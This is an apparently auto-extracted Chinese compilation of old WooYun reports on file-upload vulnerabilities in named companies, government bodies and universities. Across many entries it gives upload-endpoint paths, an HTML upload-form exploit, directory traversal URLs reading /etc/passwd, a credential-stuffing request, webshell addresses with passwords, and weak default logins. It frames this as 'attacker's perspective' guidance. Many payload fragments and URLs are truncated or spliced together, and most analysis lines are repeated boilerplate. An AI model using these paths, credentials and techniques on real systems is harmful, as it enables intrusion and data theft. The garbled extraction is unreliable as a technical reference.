# FILE-UPLOAD 漏洞分析

> 自动提取于 2026-01-23 18:57
> 样本数量: 11

## 高频参数
```
  Connector: 1次
```

## 元思考模式

### 攻击模式分布
```
  上传: 6次
  getshell: 3次
  弱口令: 1次
  执行: 1次
  遍历: 1次
```

## 典型案例

### 案例 1: wooyun-2015-0108457
**标题**: 上海地铁存在任意文件上传漏洞可Shell
**原始类型**: 漏洞类型：文件上传导致任意代码执行
**URL示例**: 
  - `http://service.shmetro.com/ihttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/201504/20150416200...`
**洞察提取**:
**Payload片段**:
  ```
  ort="java.util.*,java.io.*"%><%out.println("Hello Wo
  ```
  ```
  ort="java.util.*,java.io.*"%><%out.println("Hello Wo
  ```
  ```
  ;%>3.但是没有文件路径怎么办，好在下面留言信息中有查看照片
  ```

### 案例 2: wooyun-2015-0135258
**标题**: 上海公交集团—协同门户fck文件上传至getshell
**原始类型**: 漏洞类型：文件上传导致任意代码执行
**参数**: `Connector`
**洞察提取**:
**Payload片段**:
  ```
  or/filemanager/browser/default/connectors/test.html*
  ```
  ```
  or/filemanager/browser/default/__frmupload.html**.**
  ```

### 案例 3: wooyun-2013-039272
**标题**: 联想某站配置不当导致未授权访问及后台管理（可shell）
**原始类型**: 漏洞类型：文件上传导致任意代码执行
**URL示例**: 
  - `http://[IP]/lenovo/一、未授权访问http://[IP]/ZmptY2NtYW5hZ2Vy/可以操作二、上传shell看到上传，试试：shell地址：http://[IP]/Zmpt...`
**洞察提取**:

### 案例 4: wooyun-2014-064558
**标题**: 长沙岳麓区教育局教育云平台任意文件上传导致GETSHELL
**原始类型**: 漏洞类型：文件上传导致任意代码执行
**洞察提取**:

### 案例 5: wooyun-2011-02745
**标题**: 多玩某分站任意文件上传
**原始类型**: 漏洞类型：文件上传导致任意代码执行
**URL示例**: 
  - `http://gm2.duowan.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/duowan/20101205/x1.jsp`
**洞察提取**:
  - http://gm2.duowan.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/duowan/20101205/x1.jsp ninty我去年上传的，貌似漏洞被补了？我刚才又没传成功，如果你们没动，漏洞应该就还在

### 案例 6: wooyun-2014-068939
**标题**: 一比多上传漏洞导致网站沦陷
**原始类型**: 漏洞类型：文件上传导致任意代码执行
**URL示例**: 
  - `http://www.ebdoor.com/`
**洞察提取**:
  - 企业登陆后，在发布产品页面，“相关图片”上传模块存在漏洞，尽在浏览器端限制文件上传类型，黑客可以通过手动提交数据包方式绕过限制上传webshell，取得网站及数据库权限，可能导致大量企业用户数据泄露。深入渗透后果将不堪设想。http://www.ebdoor.com/
**Payload片段**:
  ```
  or.com/ 
  ```

### 案例 7: wooyun-2014-054352
**标题**: 融资城某分站任意命令执行漏洞
**原始类型**: 漏洞类型：文件上传导致任意代码执行
**URL示例**: 
  - `http://english.352.com/harborII/presentWebAction!queryPresentRegion.dox贵公司主站也是struts2的架构，建议对全业务线都检查一...`
**洞察提取**:
  - http://english.352.com/harborII/presentWebAction!queryPresentRegion.dox贵公司主站也是struts2的架构，建议对全业务线都检查一下，同时对服务器是否存在后面进行全面排查。
**Payload片段**:
  ```
  orII/presentWebAction!queryPresentRegion.dox贵公司主站也是s
  ```

### 案例 8: wooyun-2016-0167456
**标题**: 上海市银行同业公会某系统Getshell/涉及近200家银行相关单位/影响内网安全
**原始类型**: 漏洞类型：文件上传导致任意代码执行
**URL示例**: 
  - `http://**.**.**.**根据WooYun-2015-137850，%00截断拿到shellhttp://**.**.**.**/car/a.jsp数据库配置文件影响近200家银行文件泄露可...`
  - `http://**.**.**.**根据WooYun-2015-137850，%00截断拿到shellhttp://**.**.**.**/car/a.jsp数据库配置文件影响近200家银行文件泄露可...`
**洞察提取**:
  - http://**.**.**.**根据WooYun-2015-137850，%00截断拿到shellhttp://**.**.**.**/car/a.jsp数据库配置文件影响近200家银行文件泄露可内网渗透，这里就不继续了，挺敏感的。

### 案例 9: wooyun-2015-0143116
**标题**: 奥鹏培训网后台弱口令可getshell
**原始类型**: 漏洞类型：文件上传导致任意代码执行
**URL示例**: 
  - `http://www.ourteacher.com.cn/admin/，进入后台可上传ashx文件，利用ashx生成asp，可写入任意代码`
**洞察提取**:
  - 后台地址http://www.ourteacher.com.cn/admin/，进入后台可上传ashx文件，利用ashx生成asp，可写入任意代码

### 案例 10: wooyun-2015-097954
**标题**: 搜房网某后台系统存遍历可getshell
**原始类型**: 漏洞类型：文件上传导致任意代码执行
**URL示例**: 
  - `http://news.liupanshui.fang.com/fck低版本的遍历漏洞`

### 案例 11: wooyun-2015-0126641
**标题**: 重庆文理学院就业办官网某处上传漏洞致该校多站点包括主站服务器被控
**原始类型**: 漏洞类型：文件上传导致任意代码执行


---

## 批次 2 (索引 200-399)
> 样本数量: 8

### 高频参数
```
  method: 1次
  autoReconnect: 1次
```

### 典型案例

#### wooyun-2015-0128311
**维也纳某重要系统GETSEHLL之二（处于内部网络）**
- 参数: `autoReconnect`
- Payload: `or:x:11:0:operator:/root:/sbin/nologingames:x:12:100`

#### wooyun-2015-090186
**某通用型政府采购系统一键getshell**
- 参数: `method`
- Payload: `or编辑器，getshell如探囊取物一般简单登陆后台，修改样式，上传shell，分分钟一堆shell `

#### wooyun-2015-0158647
**川恒集团oa上传漏洞导致shell**
- Payload: `orm method='post' action='http://**.**.**.**/tools/S`

#### wooyun-2014-064031
**万户OA某处绕过限制文件上传以及sql注入（无需登陆，通杀专业版标准版）**
- Payload: `Select * From Document Where RecordID='"+ RecordID + "'"`

#### wooyun-2014-077990
**中海石油某站任意文件上传&某系统弱口令**
- 洞察:
  - mail.coes.org.cn通过u-mail查看任意用户密码上传一句话http://mail.coes.org.cn/webmail/client/cache/324/14120865545.jpg/1.php 密码xiaohttp://www.coes.org.cn/rollbook/default.aspadmin/admin
- Payload: `org.cn通过u-mail查看任意用户密码上传一句话http://mail.coes.org.cn/w`

#### wooyun-2013-036758
**杭州杭景科技平台型网上订餐系统漏洞波及官网及几十家客户**
- 洞察:
  - 1，上传漏洞地址：http://www.ihangjing.com/admin/upfile/Upload.html?Links只在前端过滤。后台没有做过滤处理。2，弱口令1：admin  123456弱口令2：jijunjian   123456其他账号口令多是123456  可暴力破解

#### wooyun-2013-022789
**中国电信某分站任意文件上传与webshell执行**
- 洞察:
  - 首先通过网站跟目录下的http://client31.v.vnet.mobi/info.php找到网站根目录，然后访问http://client31.v.vnet.mobi/images/upload.php，直接指定目录，上传php大马。

#### wooyun-2015-0105319
**中国联通wo某业务门户网站Struts命令执行漏洞直接Getshell**
- 洞察:
  - Struts 上穿漏洞直接getshellhttp://im.wo.com.cn/webportal//loginSp/userLogin.action
- Payload: `ortal//loginSp/userLogin.action `

---

## 批次 3 (索引 400-599)
> 样本: 6

### 高频参数
```
  LMID: 1
  varnum: 1
  ids: 1
```

### 典型案例

#### wooyun-2015-0123700
**某高校就业信息系统任意文件上传GETSHELL**

#### wooyun-2013-043009
**浙江联众智慧科技医院建站系统任意文件上传漏洞**
- 参数: `LMID`
- Payload: `$("fm_file").value=="")06       `

#### wooyun-2015-0141569
**运营商安全之中国联通增值业务平台系统GETSHELL**
- Payload: `;Initial Catalog=ivr;Persist Se`

#### wooyun-2014-066758
**用友某微信平台命令执行漏洞权限较大**
- 洞察:
  - http://comp.yonyou.com//shell.jsp 密码test漏洞地址 http://comp.yonyou.com/hr/sm/Sm_index.action;jsessionid=BD01456221D66A12061773C6EE4315D0
- Payload: `;jsessionid=BD01456221D66A12061`

#### wooyun-2015-0131862
**中国华能集团公司某子公司子站JBOSS配置不当导致getshell**
- 洞察:
  - 漏洞地址：http://ebs.chnzb.cn/jmx-console模块未删除导致远程上传war包getshell上传war包证明：获得shell，密码023

#### wooyun-2015-0143816
**中国山东政府采购网站上传漏洞可直接getshell**
- 参数: `varnum, ids`
- 洞察:
  - 上传漏洞地址：http://**.**.**.**/sdgp2014/regist/expappend_file.jsp?ids=-1&varnum=

---

## 批次 4 (索引 600-799)
> 样本: 5

### 高频参数
```
  password: 1
  c: 1
  m: 1
```

### 典型案例

#### wooyun-2014-063369
**Finecms v2.3.2前台设计缺陷导致暴力Getshell**
- 参数: `c, m`

#### wooyun-2015-0161997
**四川大学网络教育学院主站及多个分站 getshell**
- 参数: `password`

#### wooyun-2013-037028
**九州通医药集团存在任意脚本文件上传漏洞**

#### wooyun-2015-0120939
**上海鼎创通用型数字校园系统11处任意文件上传漏洞**
- Payload: `UnionBlog/ftb.imagegallery.aspxhttp://www.hsyr.pudong-e`

#### wooyun-2014-081607
**某港船载货物管理系统任意文件上传漏洞**
---
### [wooyun-2015-0128765] 平顶山农业信息网任意文件上传

**漏洞类型**: 文件上传导致任意代码执行

**元思考**: 
- 触发点：http://nfs.pdsagri.gov.cn/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com...
- 攻击者视角：寻找文件上传导致任意代码执行相关的入口点

**洞察**: 
- 漏洞本质：开发者在文件上传导致任意代码执行方面的安全意识不足
- 常见误区：信任用户输入，缺乏过滤/验证

**测试流程**:
1. 识别目标功能点
2. 构造测试 payload
3. 观察响应差异

**利用方法**: 
- 详情：http://nfs.pdsagri.gov.cn/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html编辑器上传漏洞 http://nfs.pdsagri.gov.cn/FCKeditor/editor/filemanagerhttps://wooyun-img.os

**POC**: 
编辑器上传漏洞 http://nfs.pdsagri.gov.cn/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html

**修复建议**: 比我懂 ==  高分吗


---
### [wooyun-2014-069222] 店连店某系统漏洞导致获取服务器权限
**厂商**: 店连店 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://oa.dld.com/继续使用以前的exp:<form enctype="multipart/form-data" action="http://oa.dld.com/general/vmeet/wbUpload.php?fileName=test.php+" method="post"><input type="file" name="Filedata" size="50"><br><input type="submit" value="Upload"></form>

**POC**: 一句话地址:http://oa.dld.com//general/vmeet/wbUpload/test.php好像是system权限,因为我可以删system32里面的东西.膜拜大黑阔！！！超级无敌后门删不掉,运维叔叔记得重装备份一下重装系统啊,不然你懂的再送几张在system32里面分析的几个文件吧里面的w3wp.exemicrox.exe还有microsft.exe 和system.exe应该还有

**绕过**: 直接利用

**修复**: 无法直视运维叔叔的技术,一定要重装系统，关键文档备份. 然后用新版的oa系统即可！
---

---
### [wooyun-2014-070521] 宜兴市房产网存在任意文件上传漏洞导致大量信息泄露
**厂商**: 宜兴市房产网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: PS：正在夜黑风高时只听外面一声响雷裤子都吓尿了！今天正好逛房产网站找房子无意间打开了宜兴市房产网，接着习惯性的问题来了，手一抖注册了个会员进去一看，咦？有头像上传！本来想用BR抓包上传想了想太麻烦干脆直接查看源码各种看各种看最终没有看到任何过滤行为连个基本的验证都没有！难道这就是你的验证？

**POC**: 直接来个JSP文件右键查看图片就尿了好吧菜刀连接PS：渗透内网？NO，淫家是好人不敢继续深入，女朋友说在深入就打你屁屁！（邪恶了）

**绕过**: 直接利用

**修复**: 做过滤做验证，重新装个安全软件，服务器上你装个麦咖啡你吓谁啊？
---

---
### [wooyun-2012-08136] 国务院国有重点企业信息采集系统存在致命安全漏洞
**厂商**: 国务院国资委信息中心 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Fckeditor编辑器漏洞啊··http://xxcj.sasac.gov.cnhttp://xxcj.sasac.gov.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector直接上传JSP木马·取得权限

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改fckeditor地址
---

---
### [wooyun-2013-023088] 科创CMS uploadImageFile_do.jsp页面文件上传漏洞
**厂商**: chinacreator.com | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 之前把漏洞上报在了cnvd，应cnvd要求把该漏洞上报至wooyun来。

**POC**: 科创CMS上传0day存在位置/creatorcms/comm_front/email/uploadImageFile_do.jsp/comm_front/email/uploadImageFile_do.jsp通过谷歌搜索关键字可以看到相关的政府网站http://www.google.com.hk/search?hl=zh-Hans-HK&source=hp&q=comm_front%2Femail%2F&gbv=2&oq=comm_front%2Femail%2F&gs_l=heirloom-hp.12...15360.15360.0.16453.1.1.0.0.0.0.0.0..0.0.

**绕过**: 直接利用

**修复**: 对上传文件进行服务端验证，只允许上传JPG,GIF,BMP文件，而且大小写全部转换成小写，对0x00，分号冒号等特殊符号进行过滤。
---

---
### [wooyun-2012-013937] PHPCMS2008任意PHP代码执行漏洞
**厂商**: phpcms | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: PHPCMS2008系统中string2array函数调用eval有高风险，在/yp/web/include/common.inc.php中$menu变量初始化不严，导致可以注入执行任意PHP代码

**POC**: $r = $db->get_one("SELECT * FROM `".DB_PRE."member_company` WHERE `userid`='$userid'");此处可能查询无结果，导致以下逻辑不执行if($r){extract($r);}结合phpcms的全局变量初始化机制，可以构造$menu变量，结合string2array函数调用eval的漏洞，成功执行任意代码因没找到官方demo，贴张官网案例网站 欧卡二手汽车网 的phpinfo图片

**绕过**: 直接利用

**修复**: 严格初始化、检查任意可能会用到的变量$menu = '';$r = $db->get_one("SELECT * FROM `".DB_PRE."member_company` WHERE `userid`='$userid'");if($r){extract($r);}
---

---
### [wooyun-2015-0110125] 美的官方某分站上传漏洞
**厂商**: midea.com | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 美的官方某分站上传漏洞

**POC**: 美的集团真是什么都做啊，还做小额贷款http://202.104.30.185/http://202.104.30.185/adminfckeditor漏洞，遍历目录http://202.104.30.185/fckeditor//editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/..fckeditor可直接上传任意格式GETWebshellhttp://202.104.30.185/UserFiles//Image/ind.js

**绕过**: 直接利用

**修复**: 你们懂得
---

---
### [wooyun-2014-072038] 李宁官网被解析html用来做游戏私服
**厂商**: http://www.li-ning.com.cn/ | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址http://www.li-ning.com.cn/uploadfile/07029/2014072945099.html这私服也太刁了吧....

**POC**: 哎，快通知官网联系此私服管理追究责任吧...

**绕过**: 直接利用

**修复**: 把这个html页面解析走..
---

---
### [wooyun-2013-035118] 联想某站点任意文件上传与下载漏洞可读取服务器任意文件
**厂商**: 联想 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在问题的站点：http://legc.lenovo.com/1.上传头像处对过滤不严导致可上传任意文件：2.好在上传的文件和web应用进行了分离无法直接利用，但是这样却导致了另外一个问题，任意文件下载，上传数据后，我们抓到这样一个请求；3.于是我们传入这样一个参数“/etc/passwd”;http://legc.lenovo.com/lefactory/static-content?contentPath=/etc/passwd

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2014-056538] 中国南方航空多个漏洞合集（任意文件读取等）
**厂商**: 中国南方航空股份有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意地址跳转：http://big5.csair.com/SuniT/www.baidu.com/index.htmlhttp://big5.csair.com/SuniT/fish.cccsair.com/钓鱼.html任意文件上传：http://olcs2.csair.com/upload.php已经上传不确定文件位置。

**POC**: 文件下载：http://www.csair.com/en/tourguide/before_ready/destination/download/download.php?FileName=download.phphttp://www.csair.com/en/tourguide/before_ready/destination/download/download.php?FileName=../../../../../../../../../../../../../../../../etc/passwd

**绕过**: 直接利用

**修复**: 都需要加入权限判断，不能直接访问。
---

---
### [wooyun-2015-0106963] 美图秀秀活动页面任意文件上传
**厂商**: 美图秀秀 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞页面:http://xiuxiu.huodong.meitu.com/0408/#rd后台上传程序未对后缀做判断.POST / HTTP/1.1Host: up.qiniu.comUser-Agent: Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateRefere

**POC**: 直接打开就是证明:http://mtapplet.meitudata.com/.

**绕过**: 直接利用

**修复**: 你懂得.
---

---
### [wooyun-2015-0120490] 苏宁易购漏洞大礼包（某内部系统5W+弱口令、任意文件上传、1566台服务器密码泄漏）
**厂商**: 江苏苏宁易购电子商务有限公司 | **年份**: 2015 | **类型**: 内部绝密信息泄漏

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 内部绝密信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别内部绝密信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这次主要以内部系统和通讯平台为主。先说一下内部平台问题1.http://ydxuexi.cnsuning.com/clp/redirectLogin.htm内部云店学习平台无验证码，后端也没有放爆破机制看了下源文件if (self != top) {top.location = self.location;};$().ready( function() {var $errorMsgTip=$("#errorMsgTip");$("#login-btn").click(function(){var $username = $("#j_username");var $password = $("#j_password");if ($username.val() == "请输入SOA工号" || $username.val() == "") {$errorMsgTip.html("请输入SOA工

**POC**: 最重要的是员工号命名规则被猜解出，仅仅撞了一个固定弱口令就撞出来5W+弱口令相关接口POST /IMuserAPI/v1/login/getimurl.do HTTP/1.1Host: imapp.suning.comUM_SYSTEM=UWPPORTAL&UUM_COMPANYCODE=oa.cnsuning.com&username=§10****01§&password=§****§根据用户名命名规则生产了一个72W的用户名字典，测试成功如下这些弱口令配合上一个漏洞里提到的内部豆芽系统，登录了几个账号看了一下。豆芽是苏宁自己开发的类似QQ和微信的软件。里面有企业所有的组织架构，员工联系方

**绕过**: 直接利用

**修复**: 我觉得问题的根源身份认证方式1.内部系统对外接口没有限制，可猜测大量的账号密码。建议内部系统统一一个认证接口登陆，加强认证防止撞库。可加入手机短信认证等2.系统间身份认证又是通用的，才导致进一步的严重信息泄漏。不同系统最好使用不同的密码，通用密码害死人啊。。3.密码使用规则没有统一标准要求。豆芽系统
---

---
### [wooyun-2015-0112312] 中国通信服务福建公司某系统SQL注射+任意文件上传
**厂商**: 中国通信服务福建公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标系统：http://www.fjccs.com.cn:8801/fjccsadmin/系统登录框存在注入POST http://www.fjccs.com.cn:8801/fjccsadmin/login.aspx HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://www.fjccs.com.cn:8801/fjccsadmin/login.aspxAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, defl

**POC**: 通过注入可得到系统登录帐号该系统大部分帐号都是弱口令000000以其中一个帐号登录，在设置，个人签名处可上传shell一句话地址：http://www.fjccs.com.cn:8801/fjccsadmin/upfiles/seal/A0000494wooyun.aspx密码：abcd

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0150857] 厦门易尔通网络某平台代理数据库涉及大量网站数据
**厂商**: 厦门易尔通网络科技有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 泄漏数据库地址http://chaoshi.12t.cnhttp://chaoshi.12t.cn/include/upload.php  修改上传源码

**POC**: 莫非传说中的两千万开房数据就是这样来的?

**绕过**: 直接利用

**修复**: 我们就这样敲了敲键盘 轻轻的来  什么也没有留下就轻轻的走....
---

---
### [wooyun-2013-028826] 海马汽车官网任意上传文件漏洞
**厂商**: 海马汽车 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 海马汽车官网存在 上传任意文件等漏洞、可能导致整个服务器沦陷。

**POC**: 主站遍历目录主站有ew编辑器分站ew编辑器主站上传漏洞小马菜刀写个txt提示下 嘎嘎。

**绕过**: 直接利用

**修复**: 删除上传文件
---

---
### [wooyun-2014-055625] 贪吃网SQL注射漏洞导致可登录网站后台
**厂商**: 贪吃网 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 贪吃网可登录网站后台，多种操作，文件上传未尝试，但是可见管理员分权限，目测通过超级管理员登录，可以修改允许上传的文件类型，完成网马上传。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: root.txt是关键，sql注入要修改
---

---
### [wooyun-2015-0146750] 网站安全狗文件上传绕过2(Windows+apache)
**厂商**: 安全狗 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 上传功能

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 利用扩展的ascii码来绕过。测试发现在文件后缀增加扩展的ascii码可绕过上传防护，比如0x7f、0x88、0xb0、0xc0、0xaa、0xe0、0xee等等。网站安全狗（APACHE版）for Windows测试主程序版本：3.5.11730测试网马库版本：2015-10-08测试环境：vmware Windows xp sp3，apache+php+mysql集成环境测试过程：直接上传php文件，会被拦截：此时在22.php后增加一个扩展的ascii码，比如0xcc，发现上传成功：

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 在文件名处理中，对上述提到的特殊字符进行适当处理。
---

---
### [wooyun-2014-087609] THEOL网络教学综合平台通用型任意文件上传
**厂商**: 清华大学教育技术研究所 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 系统全名"THEOL清华教育在线"网络教学综合平台，由清华大学教育技术研究所提供技术支持，其部署在全国大部分高校，用作选课、评分、在线考试等关键字：inurl:eol/homepage/common/或：欢迎进入网络教学综合平台1#以任意身份帐号登录该系统帐号例：teachertheol_teacherteacher_ptheol_student以及百度到的学号密码：123456000000以及百度到的学号2#在课程描述的教学录像处存在任意上传页面：http://*/eol/popups/jpkrecord/upload_file.jsp?courseId=*其代码中有对用户的权限进行判断，如果登录的是普通权限帐号则返回错误,如果登录admin帐号则判断其它if (!um.checkPermission(User.USER_PERM_JPKADMIN_BASIC)&&(column.get

**POC**: 以东华理工大学为例：（theol_student/123456）http://eol.ecit.cn/eol/homepage/common/opencourse/访问地址：http://eol.ecit.cn/eol/data/jpk/0/1.jspPOST http://eol.ecit.cn/eol/popups/jpkrecord/receive.jsp HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://eol.ecit.cn/eol/popups/jpkrecord/upload_file.jsp

**绕过**: 直接利用

**修复**: 上传点做好过滤吧，弱口令就爱莫能助了，密码最好不要明文存在EOL_USER表里说一说危害吧，很多大学已经开始用单点登录了，如果裤子被脱了，相信大部分老湿和童鞋的密码都会暴露出来，话说天朝滴老湿，你们的工资好高哟~~~
---

---
### [wooyun-2015-0110330] 看我如何一步步拿下北大方正的一项业务以及30w用户的
**厂商**: 北京北大方正电子有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 基友介绍了一款安卓手机上的写字app——写字先生，官网http://xiezi.foundertype.com/让我拾起了写字的热情 这么文艺的app当然要检测一番于是。。。随手意见反馈那里插了下。第二天，插入cookie 成功进入后台~五十万的装机量，看来用的人还不少呢。 继续 找上传，欸，还真找到一个。。。不过真的想吐槽一下。。。任意文件上传。。。这样真的好吗。。。一句话伺候。不过接下来卡了10分钟。。。上传上去了，返回文件名了，不过路径去哪找。。。我深呼一口气，推了推眼镜，从容的打开手机app ，burp，手机点击相应的模块， 路径跃然眼前。~于是 拼接我一句话地址如下：http://xiezi.foundertype.com/MrWrite2SIM/xml/20150420192358.asp 密码c上菜刀~写字先生文件源码备份，另外还包括一款好像正在测试的软件~webfont找到

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-091033] 杭州卫生局项目管理系统服务器沦陷
**厂商**: 杭州卫生局 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这里可以遍历目录http://220.191.210.78:8081/kj_projecthttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/任意上传马http://220.191.210.78:8081/kj_projecthttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/upload.jsp?type=bszn上一句话成功3389一改 netstat -ano  看一下 尝试了1314 结果可行无限制简单提权进入服务器

**POC**: 进入服务器

**绕过**: 直接利用

**修复**: 文件目录不严格 还有任意上传
---

---
### [wooyun-2013-034836] newetone主站和管理系统存高危安全漏洞导致泄露大量订单与银行卡敏感信息(密码明文存储)
**厂商**: newetone | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: AD：NewEtone国际长途电话卡可以从全球各地拨打电话，并且话费低廉、语音质量好。主站和管理系统均存在struts漏洞，配置文件泄露多个数据库配置等大量敏感信息。用户信息和电话卡信息还有各种交易信息等等诸多信息大量侧漏。用户密码明文存储。

**POC**: 主站地址：http://www.newetone.com/后台地址：http://www.newetone.com:8080/均存在struts漏洞网站首页截图主站有过滤，shell直接废了管理后台未过滤，马儿活着，配置文件截图，大量敏感信息侧漏一个账号导致多个数据库侧漏用户密码直接明文大量订单信息侧漏然后某些卡的信息验证下，成功只进了一个库瞅了几眼，其他的库没进去看，目测数据量不小。裤子什么的没动，厂商尽快修复吧，不然，各种vip。。。。。呵呵。。。。最后弱弱的问一句：咱能不用明文么？？？要不要给发个VIP啥的

**绕过**: 直接利用

**修复**: 弃用struts
---

---
### [wooyun-2011-02777] 多玩分站上传爆菊漏洞
**厂商**: 广州多玩 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 你懂的。

**POC**: http://z.duowan.com/ucenter/data/tmp/

